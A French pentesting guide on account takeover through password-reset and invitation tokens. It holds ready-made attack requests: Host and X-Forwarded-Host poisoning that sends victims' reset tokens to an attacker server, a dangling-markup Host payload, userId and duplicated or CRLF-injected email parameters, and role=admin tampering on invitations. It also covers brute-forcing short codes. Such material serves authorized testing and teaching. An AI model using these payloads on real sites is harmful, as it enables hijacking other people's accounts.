---
title: "Attaquer les jetons de réinitialisation de mot de passe et d'invitation : empoisonnement de l'en-tête Host, jetons prévisibles et prise de contrôle de compte"
description: "Comment un pentester prend le contrôle de comptes via les flux de réinitialisation et d'invitation : empoisonnement de l'en-tête Host, jetons faibles ou réutilisables, fuite dans le corps de réponse, empoisonnement par dangling markup et altération d'identifiant."
keywords:
  - réinitialisation de mot de passe
  - prise de contrôle de compte
  - empoisonnement de l'en-tête host
  - jeton d'invitation
  - magic link
  - IDOR
---

# Jetons de réinitialisation de mot de passe et d'invitation

Des faiblesses au niveau applicatif dans les jetons à usage unique qui gardent la réinitialisation de mot de passe, l'invitation de compte et la connexion par magic link. Parce qu'un jeton de réinitialisation est, par conception, un identifiant temporaire qui accorde le contrôle d'un compte, toute faille dans la façon dont il est **généré, délivré, validé ou retiré** mène directement à une **prise de contrôle de compte**.

## Vue d'ensemble

Le flux de réinitialisation canonique comporte quatre étapes : l'utilisateur soumet un identifiant à `POST /forgot-password` ; le serveur génère un jeton lié à ce compte ; le serveur envoie par e-mail un lien tel que `https://site.com/reset?token=<token>` ; l'utilisateur clique dessus et le serveur valide le jeton avant de changer le mot de passe. Les flux d'invitation sont structurellement identiques : un administrateur déclenche un e-mail avec `?invite=<token>` qui provisionne un compte, souvent avec un rôle ou un tenant pré-attribué.

La frontière de confiance casse en cinq points : **comment l'URL est construite** (le serveur fait-il confiance à l'en-tête `Host` ?), **comment le jeton est généré** (CSPRNG contre prévisible), **comment il est validé et retiré** (usage unique, expiration, lié au bon utilisateur), **comment il circule** (fuite par Referer ou par corps de réponse), et pour les invitations, **ce qu'il autorise** (un rôle choisi par l'invitant contre altérable par le destinataire).

## Exploitation

### Empoisonnement de l'en-tête Host (vol de jeton)

De nombreuses applications construisent l'URL de réinitialisation à partir de l'en-tête `Host` entrant. Remplacez-le pour que le lien dans l'e-mail de la victime pointe vers votre serveur ; quand la victime, ou un bot d'analyse d'e-mail, le charge, le jeton atterrit dans votre journal d'accès.

```
POST /forgot-password HTTP/1.1
Host: attacker-exploit-server.net
X-Forwarded-Host: attacker-exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

Lisez ensuite le jeton de la victime dans le journal de votre serveur et utilisez-le sur le vrai site : `GET /reset?token=<carlos-token>`. Si `Host` est verrouillé en bordure, testez `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-Original-URL`, ou une ligne `Host:` dupliquée, car les middlewares honorent souvent ceux-ci.

### Empoisonnement de réinitialisation de mot de passe via dangling markup

Lorsque la valeur `Host` est reflétée sans échappement dans le HTML de l'e-mail, injectez du markup qui avale le contenu suivant (y compris le jeton) dans un lien vers votre serveur. Le payload du lab de PortSwigger :

```
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//EXPLOIT-SERVER/?
```

Le guillemet non équilibré et la balise `<a>` ouverte font que l'e-mail rendu envoie l'URL de réinitialisation suivante à l'attaquant.

### Jetons prévisibles ou à faible entropie

Demandez plusieurs jetons et inspectez-les à la recherche d'une structure : compteurs séquentiels, timestamps, PRNG faible, ou `base64(userId)` / `md5(email)`. Un exemple réel est SeedDMS, qui dérivait les jetons de `uniqid()` de PHP, un timestamp, de sorte qu'un attaquant pouvait régénérer le jeton d'une victime à partir de l'heure approximative de la requête. Les codes numériques courts (de style PIN) sont brute-forçables avec Burp Intruder lorsque la durée de vie et les limites de débit sont lâches.

### Jeton non retiré, divulgué ou réutilisable

- **Pas d'usage unique / pas d'expiration** : utilisez un jeton, puis rejouez-le ; laissez un jeton vieillir au-delà de sa durée de vie annoncée et réessayez (comme dans le cas Vikunja, où les jetons n'étaient jamais invalidés à l'usage, permettant une prise de contrôle persistante).
- **Divulgué dans la réponse** : inspectez le corps et les en-têtes de la réponse `POST /forgot-password`, car certaines API renvoient le jeton directement (comme dans le cas FlowiseAI), supprimant le besoin d'accès à l'e-mail.
- **Fuite par Referer** : si la page de réinitialisation charge des ressources tierces pendant que le jeton est dans l'URL, l'URL complète fuit dans l'en-tête `Referer`.

### Altération d'identifiant et IDOR

Échangez l'identifiant pour qu'un jeton émis pour *vous* réinitialise le compte de *quelqu'un d'autre*, ou mettez votre adresse en bcc via des paramètres dupliqués :

```
POST /reset?token=<YOUR_VALID_TOKEN> HTTP/1.1
Content-Type: application/x-www-form-urlencoded

userId=victim&new-password=Pwned123!&confirm-password=Pwned123!
```

```
email=victim@x.com&email=attacker@x.com
email=victim@x.com%0d%0acc:attacker@x.com
```

Chaînez aussi le **changement d'e-mail sans ré-authentification** : avec une session détournée ou un CSRF, changez l'e-mail du compte, puis déclenchez une réinitialisation normale vers votre boîte de réception.

### Spécificités des jetons d'invitation

Les jetons d'invitation sont souvent plus faibles que les jetons de réinitialisation : entropie plus faible, longue durée de vie ou aucune expiration. Énumérez les valeurs `?invite=` ; les jetons séquentiels ou `base64(email)` permettent de revendiquer les invitations d'autrui. Lorsque le rôle ou le tenant est porté dans la requête d'acceptation (ou dans un blob encodé/JWT), altérez `role=member` en `role=admin` ou changez `org_id`/`tenant` et testez si le serveur redérive les privilèges depuis l'état stocké ou fait confiance à la valeur soumise.

## Outils

- **Burp Suite** : Repeater/Intruder pour l'injection d'en-tête Host, le brute force de jeton et l'altération de paramètres ; l'extension Param Miner pour la découverte d'en-têtes.

## Références

- PortSwigger : [Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning) et les labs [middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware) / [dangling-markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)
- OWASP : [Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- OWASP WSTG : [Testing for Weak Password Change or Reset Functionalities (WSTG-ATHN-09)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.html)
- PayloadsAllTheThings : [Account Takeover](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md)
